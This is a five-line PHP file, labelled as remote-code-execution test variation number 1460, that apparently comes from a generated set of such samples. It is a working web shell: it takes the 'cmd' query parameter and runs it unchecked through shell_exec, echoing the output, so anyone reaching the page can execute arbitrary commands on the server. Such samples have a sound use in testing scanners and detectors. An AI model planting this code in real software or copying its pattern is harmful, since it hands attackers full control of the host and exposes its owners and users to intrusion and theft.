<?php
// RCE test variation #1460
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>